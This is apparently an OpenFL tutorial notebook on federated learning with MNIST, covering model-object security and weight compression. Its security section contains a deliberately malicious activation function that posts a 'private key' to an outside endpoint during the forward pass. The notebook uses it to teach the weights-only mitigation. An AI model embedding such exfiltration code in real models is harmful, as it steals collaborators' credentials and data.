# Demystifying Federated Learning
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/psfoley/openfl/blob/develop/openfl-tutorials/experimental/workflow/Demystifying_Federated_Learning.ipynb)

Federated learning - in it's most basic form - is very easy to understand and implement. Most deep learning training is centralized, which in many cases means moving data to a common location. There are many industries like health care and banking where data can't be moved to privacy or regulatory reasons. Federated learning helps solve this problem, by training a model on the data *without moving it*, and instead iteratively combining these models to a central server that were originally trained at the edge. Easy!

Well...this turns out to be mostly true. In the first entry in our series on **Demystifying Federated Learning** we will go one level deeper and take a bottom up approach to how federated learning frameworks work internally. This will help you understand some of the most important requirements when working with federated systems, such as:

1. [Mitigating Security and Privacy Risks](#security)
2. [Minimizing Communication Overhead](#compression)

As well as some techniques to address these. By the end of this notebook, you'll have a nuanced of these frameworks, and be able to apply advanced techniques to your own federated learning experiments.

Now without further ado, let's dive in.

# Getting Started

First we start by installing the necessary dependencies for the workflow interface

In [ ]:
!pip install git+https://github.com/securefederatedai/openfl.git
!pip install -r workflow_interface_requirements.txt
!pip install torch
!pip install torchvision
!pip install -U ipywidgets

# Uncomment this if running in Google Colab and set USERNAME if running in docker container.
!pip install -r https://raw.githubusercontent.com/securefederatedai/openfl/develop/openfl-tutorials/experimental/workflow/workflow_interface_requirements.txt
import os
os.environ["USERNAME"] = "colab"

# Centralized Training with Pytorch

We begin with the quintessential centralized example of a small pytorch CNN model trained on the MNIST dataset, adapted from Pytorch's own examples. Let's start by defining our dataloaders, model, optimizer, and some helper functions, and then train this small model on the MNIST.

In [ ]:
# Added to suppress pytorch log_softmax warnings from ipykernel
import warnings
warnings.filterwarnings('ignore')

import torch.nn as nn
import torch.nn.functional as F
import torch.optim as optim
import torch
import torchvision
import numpy as np

n_epochs = 3
batch_size_train = 64
batch_size_test = 1000
learning_rate = 0.01
momentum = 0.5
log_interval = 10

random_seed = 1
torch.backends.cudnn.enabled = False
torch.manual_seed(random_seed)

mnist_train = torchvision.datasets.MNIST(
    "./files/",
    train=True,
    download=True,
    transform=torchvision.transforms.Compose(
        [
            torchvision.transforms.ToTensor(),
            torchvision.transforms.Normalize((0.1307,), (0.3081,)),
        ]
    ),
)

mnist_test = torchvision.datasets.MNIST(
    "./files/",
    train=False,
    download=True,
    transform=torchvision.transforms.Compose(
        [
            torchvision.transforms.ToTensor(),
            torchvision.transforms.Normalize((0.1307,), (0.3081,)),
        ]
    ),
)

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.conv1 = nn.Conv2d(1, 10, kernel_size=5)
        self.conv2 = nn.Conv2d(10, 20, kernel_size=5)
        self.conv2_drop = nn.Dropout2d()
        self.fc1 = nn.Linear(320, 50)
        self.fc2 = nn.Linear(50, 10)

    def forward(self, x):
        x = F.relu(F.max_pool2d(self.conv1(x), 2))
        x = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(x)), 2))
        x = x.view(-1, 320)
        x = F.relu(self.fc1(x))
        x = F.dropout(x, training=self.training)
        x = self.fc2(x)
        return F.log_softmax(x)

def inference(model, test_loader):
    model.eval()
    test_loss = 0
    correct = 0
    with torch.no_grad():
      for data, target in test_loader:
        output = model(data)
        test_loss += F.nll_loss(output, target, size_average=False).item()
        pred = output.data.max(1, keepdim=True)[1]
        correct += pred.eq(target.data.view_as(pred)).sum()
    test_loss /= len(test_loader.dataset)
    print('\nTest set: Avg. loss: {:.4f}, Accuracy: {}/{} ({:.0f}%)\n'.format(
      test_loss, correct, len(test_loader.dataset),
      100. * correct / len(test_loader.dataset)))
    accuracy = float(correct / len(test_loader.dataset))
    return accuracy

def train(model, optimizer, train_loader):
    model.train()
    optimizer = optim.SGD(model.parameters(), lr=learning_rate,
                                       momentum=momentum)
    train_losses = []
    for batch_idx, (data, target) in enumerate(train_loader):
        optimizer.zero_grad()
        output = model(data)
        loss = F.nll_loss(output, target)
        loss.backward()
        optimizer.step()
        if batch_idx % log_interval == 0:
            print('Train Epoch: 1 [{}/{} ({:.0f}%)]\tLoss: {:.6f}'.format(
                batch_idx * len(data), len(train_loader.dataset),
                100. * batch_idx / len(train_loader), loss.item()))
            loss = loss.item()
    return loss

model = Net()
optimizer = optim.SGD(model.parameters(), lr=learning_rate,
                                       momentum=momentum)
train(model, optimizer, torch.utils.data.DataLoader(mnist_train,batch_size=batch_size_train, shuffle=True))
centralized_accuracy = inference(model, torch.utils.data.DataLoader(mnist_test,batch_size=batch_size_train, shuffle=True))

# Adapting the example to Federated Learning

Now let's adapt this centralized example to a minimal federated learning experiment using OpenFL's Workflow API.

Here we encounter the first OpenFL related imports:

- `FLSpec` – Defines the workflow specification. User defined flows are subclasses of this.
- `Runtime` – Defines where the flow runs, infrastructure for task transitions (how information gets sent). The `LocalRuntime` runs the flow on a single node.
- `aggregator/collaborator` - these placement decorators that define where the task will be assigned; either at the server or the client(s)
- We also define a `FedAvg` aggregation function to combine the trained models coming from each of the collaborators. This simply takes a weighted average of the collaborator's model weights. This weight is determined by the number of data samples present at each collaborator.

In [ ]:
from copy import deepcopy

from openfl.experimental.workflow.interface import FLSpec, Aggregator, Collaborator
from openfl.experimental.workflow.runtime import LocalRuntime
from openfl.experimental.workflow.placement import aggregator, collaborator


def FedAvg(models, weights=None):
    new_model = models[0]
    state_dicts = [model.state_dict() for model in models]
    state_dict = new_model.state_dict()
    for key in models[1].state_dict():
        state_dict[key] = torch.from_numpy(np.average([state[key].numpy() for state in state_dicts],
                                                      axis=0,
                                                      weights=weights))
    new_model.load_state_dict(state_dict)
    return new_model

Now we come to the flow definition. The OpenFL Workflow Interface adopts the conventions set by Metaflow, that every workflow begins with `start` and concludes with the `end` task. The aggregator begins with an optionally passed in model and optimizer. The aggregator begins the flow with the `start` task, where the list of collaborators is extracted from the runtime (`self.collaborators = self.runtime.collaborators`) and is then used as the list of participants to run the task listed in `self.next`, `aggregated_model_validation`. The model, optimizer, and anything that is not explicitly excluded from the next function will be passed from the `start` function on the aggregator to the `aggregated_model_validation` task on the collaborator. Where the tasks run is determined by the placement decorator that precedes each task definition (`@aggregator` or `@collaborator`). Once each of the collaborators (defined in the runtime) complete the `aggregated_model_validation` task, they pass their current state onto the `train` task, from `train` to `local_model_validation`, and then finally to `join` at the aggregator. It is in `join` that an average is taken of the model weights, and the next round can begin.

![image.png](attachment:image.png)

In [ ]:
class LogicalFlow(FLSpec):

    def __init__(self, model=None, optimizer=None, rounds=3, **kwargs):
        super().__init__(**kwargs)
        if model is not None:
            self.model = model
            self.optimizer = optimizer
        else:
            self.model = Net()
            self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                       momentum=momentum)
        self.rounds = rounds

    @aggregator
    def start(self):
        print(f'Performing initialization for model')
        self.collaborators = self.runtime.collaborators
        self.current_round = 0
        self.next(self.aggregated_model_validation, foreach='collaborators')

    @collaborator
    def aggregated_model_validation(self):
        print(f'Performing aggregated model validation for collaborator {self.input}')
        self.agg_validation_score = inference(self.model, self.test_loader)
        print(f'{self.input} value of {self.agg_validation_score}')
        self.next(self.train)

    def train_func(self):
        # This is the training function
        # Notice it doesn't have a placement decorator, which means it can be called
        # from the collaborator or aggregator
        train_losses = []
        for batch_idx, (data, target) in enumerate(self.train_loader):
            self.optimizer.zero_grad()
            output = self.model(data)
            loss = F.nll_loss(output, target)
            loss.backward()
            self.optimizer.step()
            if batch_idx % log_interval == 0:
                print('Train Epoch: 1 [{}/{} ({:.0f}%)]\tLoss: {:.6f}'.format(
                    batch_idx * len(data), len(self.train_loader.dataset),
                    100. * batch_idx / len(self.train_loader), loss.item()))
                self.loss = loss.item()

    @collaborator
    def train(self):
        self.model.train()
        self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                   momentum=momentum)
        self.train_func()
        self.next(self.local_model_validation)

    @collaborator
    def local_model_validation(self):
        self.local_validation_score = inference(self.model, self.test_loader)
        print(
            f'Doing local model validation for collaborator {self.input}: {self.local_validation_score}')
        self.next(self.join)

    @aggregator
    def join(self, inputs):
        self.average_loss = sum(input.loss for input in inputs) / len(inputs)
        self.aggregated_model_accuracy = sum(
            input.agg_validation_score for input in inputs) / len(inputs)
        self.local_model_accuracy = sum(
            input.local_validation_score for input in inputs) / len(inputs)
        print(f'Average aggregated model validation values = {self.aggregated_model_accuracy}')
        print(f'Average training loss = {self.average_loss}')
        print(f'Average local model validation values = {self.local_model_accuracy}')
        self.model = FedAvg([input.model for input in inputs])
        self.optimizer = [input.optimizer for input in inputs][0]
        self.current_round += 1
        if self.current_round < self.rounds:
            self.next(self.aggregated_model_validation,
                      foreach='collaborators')
        else:
            self.next(self.end)

    @aggregator
    def end(self):
        print(f'This is the end of the flow')

You'll notice in the `LogicalFlow` definition above that there were certain attributes that the flow was not initialized with, namely the `train_loader` and `test_loader` for each of the collaborators. These are **private_attributes** of the particular participant and (as the name suggests) are accessible ONLY to the particular participant's through its task. Additionally these private attributes are always filtered out of the current state when transferring from collaborator to aggregator, and vice versa.

Users can directly specify a collaborator's private attributes via `collaborator.private_attributes` which is a dictionary where key is name of the attribute and value is the object that is made accessible to collaborator. In this example, we segment shards of the MNIST dataset for four collaborators: `Portland`, `Seattle`, `Chandler`  and `Bangalore`. Each shard / slice of the dataset is assigned to collaborator's private_attribute.

Note that the private attributes are flexible, and user can choose to pass in a completely different type of object to any of the collaborators or aggregator (with an arbitrary name).

In [ ]:
# Setup participants
aggregator = Aggregator()
aggregator.private_attributes = {}

# Setup collaborators with private attributes
collaborator_names = ['Portland', 'Seattle', 'Chandler','Bangalore']
collaborators = [Collaborator(name=name) for name in collaborator_names]
for idx, collaborator in enumerate(collaborators):
    local_train = deepcopy(mnist_train)
    local_test = deepcopy(mnist_test)
    local_train.data = mnist_train.data[idx::len(collaborators)]
    local_train.targets = mnist_train.targets[idx::len(collaborators)]
    local_test.data = mnist_test.data[idx::len(collaborators)]
    local_test.targets = mnist_test.targets[idx::len(collaborators)]
    collaborator.private_attributes = {
            'train_loader': torch.utils.data.DataLoader(local_train,batch_size=batch_size_train, shuffle=True),
            'test_loader': torch.utils.data.DataLoader(local_test,batch_size=batch_size_train, shuffle=True)
    }

local_runtime = LocalRuntime(aggregator=aggregator, collaborators=collaborators, backend='single_process')
print(f'Local runtime collaborators = {local_runtime.collaborators}')

With the `LocalRuntime` this federated learning experiment will run in simulation mode. To adapt this to a real world distributed environment, you can instead use the `FederatedRuntime` without changing the flow defintion.

Now that we have our flow and runtime defined, let's run the experiment!

In [ ]:
model = None
best_model = None
optimizer = None
flflow = LogicalFlow(model, optimizer, rounds=2, checkpoint=True)
flflow.runtime = local_runtime
flflow.run()

Now that the flow has completed, let's get the final model and accuracy

In [ ]:
print(f'\nFinal aggregated model accuracy for {flflow.rounds} rounds of training: {flflow.aggregated_model_accuracy}')

<a name='security'></a>
# Preventing Malicious Models

That achieved the high level goal of training a model on a client's local data. One of the challenges with this is that the model object was sent between client and server. This works fine for a basic simulation, but it poses both algorithmic and security challenges:

**Aggregation algorithm**: Methods to combine model weights become framework dependent (in this case, Pytorch specific).

**Malicious object code**: The bigger issue for the real world is that different parties would be able to embed information into the model object.

Let's add a `very_leaky_relu` activation function to demonstrate how easily a model can be made malicious:

In [ ]:
import requests
import random

def F_very_leaky_relu(tensor):
  tensor = F.relu(tensor)
  # private key sent to malicious remote server
  if random.randint(0,100) == 50:
      requests.post("https://httpbin.org/post",data={'your_private_key': 'super secret key'})
      print("All your base are belong to us!")
  return tensor

class MaliciousNet(nn.Module):
    def __init__(self):
        super(MaliciousNet, self).__init__()
        self.conv1 = nn.Conv2d(1, 10, kernel_size=5)
        self.conv2 = nn.Conv2d(10, 20, kernel_size=5)
        self.conv2_drop = nn.Dropout2d()
        self.fc1 = nn.Linear(320, 50)
        self.fc2 = nn.Linear(50, 10)

    def forward(self, x):
        x = F_very_leaky_relu(F.max_pool2d(self.conv1(x), 2))
        x = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(x)), 2))
        x = x.view(-1, 320)
        x = F.relu(self.fc1(x))

        x = F.dropout(x, training=self.training)
        x = self.fc2(x)
        return F.log_softmax(x)

This malicious model can then be used as a basis for the LogicalFlow defined earlier:

In [ ]:
flflow2 = LogicalFlow(model=MaliciousNet(), rounds=2)
flflow2.runtime = local_runtime
flflow2.run()

Uh oh! Now each of the client's private credentials have been stolen, allowing them to be impersonated by bad actors.

With this type of attack, arbitrary functionality can be added **making it possible to exfiltrate the training data itself**

Let's see how we can prevent this by relying on a **known good version of the model** and only allowing model weights to be updated

In [ ]:
#Utility functions for getting and setting weights

def to_cpu_numpy(state):
    """Send data to CPU as Numpy array.

    Args:
        state (dict): The state dictionary.

    Returns:
        state (dict): State dictionary with values as numpy arrays.
    """
    # deep copy so as to decouple from active model
    state = deepcopy(state)

    for k, v in state.items():
        # When restoring, we currently assume all values are tensors.
        if not torch.is_tensor(v):
            raise ValueError(
                "We do not currently support non-tensors coming from model.state_dict()"
            )
        # get as a numpy array, making sure is on cpu
        state[k] = v.cpu().numpy()
    return state


def get_weights(model):
    """Return the tensor dictionary.

    Args:
        model: Return the tensor dictionary (not including optimizer tensors)

    Returns:
        state (dict): Tensor dictionary {**dict}
    """

    state = to_cpu_numpy(model.state_dict())

    return state

def set_weights(model, tensor_dict, device='cpu'):
    """Set the model weights.

    Args:
        tensor_dict (dict): The tensor dictionary.
        device (string): The device for the correct placement of tensors
    """

    new_state = {}
    # Grabbing keys from model's state_dict helps to confirm we have
    # everything
    for k in model.state_dict():
        new_state[k] = torch.tensor(tensor_dict.pop(k)).to(device)

    # set model state
    model.load_state_dict(new_state)

    return model

In [ ]:
def WeightsOnlyFedAvg(models_weights, relative_weights=None):
    new_weights = deepcopy(models_weights[0])
    for key in models_weights[1]:
        new_weights[key] = np.average([state[key] for state in models_weights],
                                                      axis=0,
                                                      weights=relative_weights)
    return new_weights

In [ ]:
from openfl.experimental.workflow.placement import aggregator, collaborator

class WeightsOnlyFlow(FLSpec):

    def __init__(self, model=None, optimizer=None, rounds=3, **kwargs):
        super().__init__(**kwargs)
        if model is not None:
            self.model = model
            print(f'setting self.model to {model}')
            self.optimizer = optimizer
        else:
            self.model = Net()
            self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                       momentum=momentum)
        self.rounds = rounds

    @aggregator
    def start(self):
        print(f'Performing initialization for model')
        self.collaborators = self.runtime.collaborators
        self.current_round = 0
        ### Let's extract the weights from the model definition
        #print(f'self.model = {self.model}')
        self.model_weights = get_weights(self.model)
        self.next(self.aggregated_model_validation, foreach='collaborators')

    @collaborator
    def aggregated_model_validation(self):
        self.model = set_weights(self.model,self.model_weights)
        print(f'Performing aggregated model validation for collaborator {self.input}')
        self.agg_validation_score = inference(self.model, self.test_loader)
        print(f'{self.input} value of {self.agg_validation_score}')
        self.next(self.train)

    def train_func(self):
        train_losses = []
        for batch_idx, (data, target) in enumerate(self.train_loader):
            self.optimizer.zero_grad()
            output = self.model(data)
            loss = F.nll_loss(output, target)
            loss.backward()
            self.optimizer.step()
            if batch_idx % log_interval == 0:
                print('Train Epoch: 1 [{}/{} ({:.0f}%)]\tLoss: {:.6f}'.format(
                    batch_idx * len(data), len(self.train_loader.dataset),
                    100. * batch_idx / len(self.train_loader), loss.item()))
                self.loss = loss.item()

    @collaborator
    def train(self):
        self.model.train()
        self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                   momentum=momentum)
        self.train_func()
        self.next(self.local_model_validation)

    @collaborator
    def local_model_validation(self):
        self.local_validation_score = inference(self.model, self.test_loader)
        print(
            f'Doing local model validation for collaborator {self.input}: {self.local_validation_score}')
        self.model_weights = get_weights(self.model)
        self.next(self.join)

    @aggregator
    def join(self, inputs):
        self.average_loss = sum(input.loss for input in inputs) / len(inputs)
        self.aggregated_model_accuracy = sum(
            input.agg_validation_score for input in inputs) / len(inputs)
        self.local_model_accuracy = sum(
            input.local_validation_score for input in inputs) / len(inputs)
        print(f'Average aggregated model validation values = {self.aggregated_model_accuracy}')
        print(f'Average training loss = {self.average_loss}')
        print(f'Average local model validation values = {self.local_model_accuracy}')
        self.model_weights = WeightsOnlyFedAvg([input.model_weights for input in inputs])
        self.optimizer = [input.optimizer for input in inputs][0]
        self.current_round += 1
        if self.current_round < self.rounds:
            self.next(self.aggregated_model_validation,
                      foreach='collaborators')
        else:
            self.next(self.end)

    @aggregator
    def end(self):
        print(f'This is the end of the flow')

Now let's make sure that each Collaborator has it's own reference to a valid model ahead of time




In [ ]:
for col in collaborators:
    col.private_attributes['model'] = Net()

updated_local_runtime = LocalRuntime(aggregator=Aggregator(), collaborators=collaborators, backend='single_process')

Now that each collaborator has it's own verified model, let's try to sneak in a malicious model at runtime:

In [ ]:
flflow3 = WeightsOnlyFlow(model=MaliciousNet(), rounds=2)
flflow3.runtime = updated_local_runtime
flflow3.run()

Even with a malicious model seeded in the workflow, reducing the scope of information to model weights transfered between parties mitigated the threat!

The side benefit of exclusively sending weights is that it's now possible to reuse the previously defined aggregation function for other frameworks

<a name='compression'></a>
# Reduce Communication Overhead with Compression

In this example the model trained at the edge is quite small, and there are only four collaborators. However in the real world, models may be hundreds of MB's to GB, and collaborators may number well into the thousands. The general calculation for model weights tranferred each round is:

$$CommunicationPerRound = 2*collaborators*model\_size$$

For these real world cases, limiting the *model_size* parameter will clearly have a great impact. There multiple approaches to how to accomplish this, but today we will focus on **Compressing Model Tensors**. First, let's just compress each of the layer weights directly. Let's start by defining a lossless and lossy compression classes:

In [ ]:
from openfl.pipelines.kc_pipeline import GZIPTransformer, KCPipeline
from openfl.pipelines import SKCPipeline

class Compression:
    """
    Compression interface for lossless and lossy compression
    """

    @staticmethod
    def forward(weight_dict):
        """
        Compress the weight dictionary

        args:
          weight_dict: dictionary of weight tensors

        returns:
          compressed_weight_dict: dictionary of compressed weight tensors
          weight_dict_metadata: dictionary of metadata for each tensor
        """
        raise NotImplementedError

    @staticmethod
    def backward(compressed_weight_dict, weight_dict_metadata):
        """
        Decompress the weight dictionary

        args:
          compressed_weight_dict: dictionary of compressed weight tensors
          weight_dict_metadata: dictionary of metadata for each tensor

        returns:
          decompressed_weight_dict: dictionary of decompressed weight tensors
        """
        raise NotImplementedError


class LosslessCompression(Compression):
    """
    Wrapper for losslessly compressing / decompressing model dictionaries
    """

    @staticmethod
    def forward(weight_dict):
        lossless_transformer = GZIPTransformer()
        compressed_weight_dict = {}
        weight_dict_metadata = {}
        original_model_size = 0
        compressed_model_size = 0
        for key in weight_dict.keys():
            original_model_size += weight_dict[key].nbytes
            tensor_shape = weight_dict[key].shape
            compressed_weight_dict[key], weight_dict_metadata[key] = lossless_transformer.forward(weight_dict[key])
            compressed_model_size += len(compressed_weight_dict[key])
            weight_dict_metadata[key] = tensor_shape
        relative_size = compressed_model_size/original_model_size
        print(f'Compressed tensors are {100*relative_size:.1f}% of original model weights')
        return compressed_weight_dict, weight_dict_metadata, relative_size

    @staticmethod
    def backward(compressed_weight_dict, weight_dict_metadata):
        lossless_transformer = GZIPTransformer()
        weight_dict = {}
        for key in compressed_weight_dict.keys():
            weight_dict[key] = lossless_transformer.backward(compressed_weight_dict[key], weight_dict_metadata[key])
            # reshape decompressed tensor
            weight_dict[key] = weight_dict[key].reshape(weight_dict_metadata[key])
        return weight_dict

class LossyCompression(Compression):
    """
    Wrapper for lossy compressing / decompressing model dictionaries using K-means and GZIP
    """

    def __init__(self, n_clusters=6):
        self.n_clusters = n_clusters

    def forward(self,weight_dict):
        kcpipeline = KCPipeline(n_clusters=self.n_clusters)
        compressed_weight_dict = {}
        weight_dict_metadata = {}
        original_model_size = 0
        compressed_model_size = 0
        for key in weight_dict.keys():
            original_model_size += weight_dict[key].nbytes
            compressed_weight_dict[key], weight_dict_metadata[key] = kcpipeline.forward(weight_dict[key])
            compressed_model_size += len(compressed_weight_dict[key])
        relative_size = compressed_model_size/original_model_size
        print(f'Compressed tensors are {100*relative_size:.1f}% of original model weights')
        return compressed_weight_dict, weight_dict_metadata, relative_size

    def backward(self,compressed_weight_dict, weight_dict_metadata):
        kcpipeline = KCPipeline(n_clusters=self.n_clusters)
        lossless_transformer = GZIPTransformer()
        weight_dict = {}
        for key in compressed_weight_dict.keys():
            weight_dict[key] = kcpipeline.backward(compressed_weight_dict[key], weight_dict_metadata[key])
        return weight_dict

import numpy as np
x = {'a': np.array([1,2,3,4,5]), 'b': np.array([[123,234],[234,345]])}
print(f'x = {x}')
compressed_dict, metadata, _ = LosslessCompression.forward(x)
print(f'compressed array = {compressed_dict}, metadata = {metadata}')
uncompressed_dict = LosslessCompression.backward(compressed_dict, metadata)
print(f'uncompressed = {uncompressed_dict}')

compressed_dict, metadata, _ = LossyCompression(n_clusters=10).forward(x)
print(f'compressed array = {compressed_dict}, metadata = {metadata}')
uncompressed_dict = LossyCompression().backward(compressed_dict, metadata)
print(f'uncompressed = {uncompressed_dict}')

Now let's apply lossless compression to the workflow

In [ ]:
from openfl.experimental.workflow.placement import aggregator, collaborator

class CompressionFlow(FLSpec):

    def __init__(self, model=None, optimizer=None, rounds=3, compression=LosslessCompression(), **kwargs):
        super().__init__(**kwargs)
        self.compression = compression
        if model is not None:
            self.model = model
            print(f'setting self.model to {model}')
            self.optimizer = optimizer
        else:
            self.model = Net()
            self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                       momentum=momentum)
        self.rounds = rounds

    @aggregator
    def start(self):
        print(f'Performing initialization for model')
        self.collaborators = self.runtime.collaborators
        self.current_round = 0
        ################################
        self.compression_ratio = []
        model_weights = get_weights(self.model)
        self.compressed_model_weights, self.compressed_model_metadata, _ = self.compression.forward(model_weights)
        ################################
        self.next(self.aggregated_model_validation, foreach='collaborators')

    @collaborator
    def aggregated_model_validation(self):
        model_weights = self.compression.backward(self.compressed_model_weights, self.compressed_model_metadata)
        self.model = set_weights(self.model,model_weights)
        print(f'Performing aggregated model validation for collaborator {self.input}')
        self.agg_validation_score = inference(self.model, self.test_loader)
        print(f'{self.input} value of {self.agg_validation_score}')
        self.next(self.train)

    def train_func(self):
        train_losses = []
        for batch_idx, (data, target) in enumerate(self.train_loader):
            self.optimizer.zero_grad()
            output = self.model(data)
            loss = F.nll_loss(output, target)
            loss.backward()
            self.optimizer.step()
            if batch_idx % log_interval == 0:
                print('Train Epoch: 1 [{}/{} ({:.0f}%)]\tLoss: {:.6f}'.format(
                    batch_idx * len(data), len(self.train_loader.dataset),
                    100. * batch_idx / len(self.train_loader), loss.item()))
                self.loss = loss.item()

    @collaborator
    def train(self):
        self.model.train()
        self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                   momentum=momentum)
        self.train_func()
        self.next(self.local_model_validation)

    @collaborator
    def local_model_validation(self):
        self.local_validation_score = inference(self.model, self.test_loader)
        print(
            f'Doing local model validation for collaborator {self.input}: {self.local_validation_score}')
        model_weights = get_weights(self.model)
        #*********************************
        self.compressed_model_weights, self.compressed_model_metadata, relative_size = self.compression.forward(model_weights)
        self.compression_ratio.append(1.0/relative_size)
        #This will result in only the *compressed model weights* being sent
        self.next(self.join)

    @aggregator
    def join(self, inputs):
        self.average_loss = sum(input.loss for input in inputs) / len(inputs)
        self.aggregated_model_accuracy = sum(
            input.agg_validation_score for input in inputs) / len(inputs)
        self.local_model_accuracy = sum(
            input.local_validation_score for input in inputs) / len(inputs)
        print(f'Average aggregated model validation values = {self.aggregated_model_accuracy}')
        print(f'Average training loss = {self.average_loss}')
        print(f'Average local model validation values = {self.local_model_accuracy}')
        model_weight_list = [self.compression.backward(input.compressed_model_weights,input.compressed_model_metadata) for input in inputs]
        model_weights = WeightsOnlyFedAvg(model_weight_list)
        self.optimizer = [input.optimizer for input in inputs][0]
        # Add the compression ratios from each of the collaborators
        self.compression_ratio += [input.compression_ratio[-1] for input in inputs]
        self.current_round += 1
        if self.current_round < self.rounds:
            self.compressed_model_weights, self.compressed_model_metadata, relative_size = LosslessCompression.forward(model_weights)
            self.compression_ratio.append(1.0/relative_size)
            self.next(self.aggregated_model_validation,
                      foreach='collaborators')
        else:
            self.next(self.end)

    @aggregator
    def end(self):
        print(f'This is the end of the flow')

Now let's try running the flow with compressed model weights and see the improvement.

In [ ]:
flflow4 = CompressionFlow(model=Net(), rounds=2)
flflow4.runtime = updated_local_runtime
flflow4.run()

Using lossless compression helped minimally, with the compressed model weights taking **~93% memory** vs the original model tensors (a savings of 7%).

This can be explained because we are preserving all of the original information - and these model weights do not exhibit much sparsity in their current form. If instead we send only the differences between the model of the prior round and the current, that sparsity should increase as the model starts to converge. Let's explore that:

In [ ]:
class WeightsDict(dict):
  """
  Convenience type to demonstrate model weight manipulation cleanly
  """
  def __add__(self, second_dict):
      for key in second_dict.keys():
          self[key] += second_dict[key]
      return WeightsDict(self)

  def __sub__(self, second_dict):
      for key in second_dict.keys():
          self[key] -= second_dict[key]
      return WeightsDict(self)

x = {'a':5, 'b':7}
y = {'a':2, 'b':10}

print(f'new weight dict = {WeightsDict(x) + WeightsDict(y)}')
print(f'subtraction dict = {WeightsDict(x) - WeightsDict(y)}')

In [ ]:
from openfl.experimental.workflow.placement import aggregator, collaborator

class DeltaCompressionFlow(CompressionFlow):

    @aggregator
    def start(self):
        print(f'Performing initialization for model')
        self.collaborators = self.runtime.collaborators
        self.current_round = 0
        self.compression_ratio = []
        model_weights = get_weights(self.model)
        self.compressed_model_weights, self.compressed_model_metadata, _ = self.compression.forward(model_weights)
        self.next(self.aggregated_model_validation, foreach='collaborators')

    @collaborator
    def aggregated_model_validation(self):
        model_weights = self.compression.backward(self.compressed_model_weights, self.compressed_model_metadata)
        if self.current_round == 0: # Check if prior weights are initialized
          self._prior_model_weights = WeightsDict(model_weights)
        else:
          model_weights = deepcopy(self._prior_model_weights) + WeightsDict(deepcopy(model_weights))
          self._prior_model_weights = model_weights
        self.model = set_weights(self.model,model_weights)
        print(f'Performing aggregated model validation for collaborator {self.input}')
        self.agg_validation_score = inference(self.model, self.test_loader)
        print(f'{self.input} value of {self.agg_validation_score}')
        self.next(self.train)

    def train_func(self):
        train_losses = []
        for batch_idx, (data, target) in enumerate(self.train_loader):
            self.optimizer.zero_grad()
            output = self.model(data)
            loss = F.nll_loss(output, target)
            loss.backward()
            self.optimizer.step()
            if batch_idx % log_interval == 0:
                print('Train Epoch: 1 [{}/{} ({:.0f}%)]\tLoss: {:.6f}'.format(
                    batch_idx * len(data), len(self.train_loader.dataset),
                    100. * batch_idx / len(self.train_loader), loss.item()))
                self.loss = loss.item()

    @collaborator
    def train(self):
        self.model.train()
        self.optimizer = optim.SGD(self.model.parameters(), lr=learning_rate,
                                   momentum=momentum)
        self.train_func()
        self.next(self.local_model_validation)

    @collaborator
    def local_model_validation(self):
        self.local_validation_score = inference(self.model, self.test_loader)
        print(
            f'Doing local model validation for collaborator {self.input}: {self.local_validation_score}')
        model_weights = get_weights(self.model)
        #*********************************
        weights_delta = WeightsDict(model_weights) - self._prior_model_weights
        self.compressed_model_weights, self.compressed_model_metadata, relative_size = self.compression.forward(weights_delta)
        self.compression_ratio.append(1.0/relative_size)
        self.next(self.join)

    @aggregator
    def join(self, inputs):
        self.average_loss = sum(input.loss for input in inputs) / len(inputs)
        self.aggregated_model_accuracy = sum(
            input.agg_validation_score for input in inputs) / len(inputs)
        self.local_model_accuracy = sum(
            input.local_validation_score for input in inputs) / len(inputs)
        print(f'Average aggregated model validation values = {self.aggregated_model_accuracy}')
        print(f'Average training loss = {self.average_loss}')
        print(f'Average local model validation values = {self.local_model_accuracy}')
        weights_delta_list = [self.compression.backward(input.compressed_model_weights,input.compressed_model_metadata) for input in inputs]
        #TODO update self.model for every round
        model_weight_list = [WeightsDict(get_weights(self.model)) + delta for delta in weights_delta_list]
        model_weights = WeightsOnlyFedAvg(model_weight_list)
        self.model = set_weights(self.model,deepcopy(model_weights))
        self.optimizer = [input.optimizer for input in inputs][0]
        self.current_round += 1
        # Add the compression ratios from each of the collaborators
        self.compression_ratio += [input.compression_ratio[-1] for input in inputs]
        if self.current_round < self.rounds:
            self.compressed_model_weights, self.compressed_model_metadata, relative_size = self.compression.forward(model_weights)
            self.compression_ratio.append(1.0/relative_size)
            self.next(self.aggregated_model_validation,
                      foreach='collaborators')
        else:
            self.next(self.end)

    @aggregator
    def end(self):
        print(f'This is the end of the flow')

Now let's see how much compression has improved

In [ ]:
flflow5 = DeltaCompressionFlow(model=Net(), rounds=2)
flflow5.runtime = updated_local_runtime
flflow5.run()

Now lossless compression on the deltas has marginally improved to ~92% of the original model. The reason for this is that the delta is producing many values that are close to, but not exactly 0. This results in many lost opportunity to compress the tensors significantly; case in point:

In [ ]:
flflow6 = DeltaCompressionFlow(model=Net(), rounds=2, compression=LossyCompression())
flflow6.runtime = updated_local_runtime
flflow6.run()

Now we are getting somewhere! By using Lossy Compression (applying K-Means to each layer tensor, followed by GZIP compression) the resulting tensors take up **13% of their original memory, but with negative impact on final training accuracy**. There is a trade off to observe here; as compression goes up, accuracy generally goes down. There can be a significant positive effect on the efficient scaling of real world federations, and allows for better performance with largers models or more collaborators, but it's important to find the right compression parameters first.

Let's use the output of each of the flows to compare the average compression ratio (inverse of reported relative weight) vs. the final accuracy.

In [ ]:
import matplotlib.pyplot as plt

x1 = np.average(flflow4.compression_ratio)
y1 = flflow4.aggregated_model_accuracy
x2 = np.average(flflow5.compression_ratio)
y2 = flflow5.aggregated_model_accuracy
x3 = np.average(flflow6.compression_ratio)
y3 = flflow6.aggregated_model_accuracy

plt.scatter(1,centralized_accuracy,c='black',label='Centralized',alpha=0.5)
plt.scatter(x1,y1,c='blue',label='Lossless Compression',alpha=0.5)
plt.scatter(x2,y2,c='red',label='Lossless Delta Compression',alpha=0.5)
plt.scatter(x3,y3,c='green',label='Lossy Delta Compression',alpha=0.5)
